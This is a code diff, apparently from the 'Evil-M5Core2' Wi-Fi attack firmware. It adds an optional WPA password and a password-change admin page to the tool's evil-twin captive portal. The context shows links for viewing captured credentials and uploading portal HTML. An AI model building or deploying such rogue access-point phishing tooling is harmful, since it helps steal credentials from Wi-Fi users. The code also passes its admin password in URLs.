@@ -85,7 +85,7 @@
   
   File fsUploadFile; // global variable for file upload
   
-  
+  String captivePortalPassword = ""; // 
   
   // Probe Sniffind part
   
@@ -687,7 +687,12 @@ void firstScanWifiNetworks() {
 void createCaptivePortal() {
       String ssid = clonedSSID.isEmpty() ? "Evil-M5Core2" : clonedSSID;
       WiFi.mode(WIFI_MODE_APSTA);
-      WiFi.softAP(clonedSSID.c_str());
+      if (captivePortalPassword == ""){
+         WiFi.softAP(clonedSSID.c_str());
+        }else{
+         WiFi.softAP(clonedSSID.c_str(),captivePortalPassword.c_str());
+        }
+
       dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
       isCaptivePortalOn = true;
   
@@ -718,6 +723,7 @@ void createCaptivePortal() {
           html += "<a href='javascript:void(0);' onclick='this.href=\"/credentials?pass=\"+document.getElementsByName(\"pass\")[0].value'>Credentials</a>";
           html += "<a href='javascript:void(0);' onclick='this.href=\"/uploadhtmlfile?pass=\"+document.getElementsByName(\"pass\")[0].value'>Upload File On SD</a>";
           html += "<a href='javascript:void(0);' onclick='this.href=\"/check-sd-file?pass=\"+document.getElementsByName(\"pass\")[0].value'>Check SD File</a>";
+          html += "<a href='javascript:void(0);' onclick='this.href=\"/Change-Portal-Password?pass=\"+document.getElementsByName(\"pass\")[0].value'>Change WPA Password</a>";
           html += "</form></div></body></html>";
           server.send(200, "text/html", html);
           Serial.println("-------------------");
@@ -808,7 +814,8 @@ void createCaptivePortal() {
       }, handleFileUpload);
   
       server.on("/delete-sd-file", HTTP_GET, handleFileDelete);
-  
+      
+      server.on("/Change-Portal-Password", HTTP_GET, handleChangePassword);
   
   
       server.onNotFound([]() {
@@ -1082,6 +1089,49 @@ void handleFileDelete() {
       }
       root.close();
   }
+
+
+void serveChangePasswordPage() {
+    String password = server.arg("pass");
+    if (password != accessWebPassword) {
+        server.send(403, "text/html", "<html><body><p>Unauthorized</p></body></html>");
+        return;
+    }
+
+    String html = "<html><head><style>";
+    html += "body { background-color: #333; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }";
+    html += "form { background-color: #444; padding: 20px; border-radius: 8px; display: inline-block; }";
+    html += "input[type='password'], input[type='submit'] { width: 80%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }";
+    html += "input[type='submit'] { background-color: #008CBA; color: white; cursor: pointer; }";
+    html += "input[type='submit']:hover { background-color: #005F73; }";
+    html += "</style></head><body>";
+    html += "<form action='/Change-Portal-Password-demand' method='get'>";
+    html += "<input type='hidden' name='pass' value='" + password + "'>";
+    html += "<h2>Change Portal Password</h2>";
+    html += "New Password: <br><input type='password' name='newPassword'><br>";
+    html += "<input type='submit' value='Change Password'>";
+    html += "</form><br>Leave empty for an open AP.<br>Remember to deploy the portal again after changing the password.<br></body></html>";
+    server.send(200, "text/html", html);
+}
+
+
+
+void handleChangePassword() {
+    server.on("/Change-Portal-Password-demand", HTTP_GET, []() {
+        String password = server.arg("pass");
+        if (password != accessWebPassword) {
+            server.send(403, "text/html", "<html><body><p>Unauthorized</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
+            return;
+        }
+        
+        String newPassword = server.arg("newPassword");
+        captivePortalPassword = newPassword;
+        server.send(200, "text/html", "<html><body><p>Password Changed Successfully !!</p><script>setTimeout(function(){window.history.back();}, 2000);</script></body></html>");
+    });
+
+    serveChangePasswordPage();
+}
+
   
   
   void changePortal() {
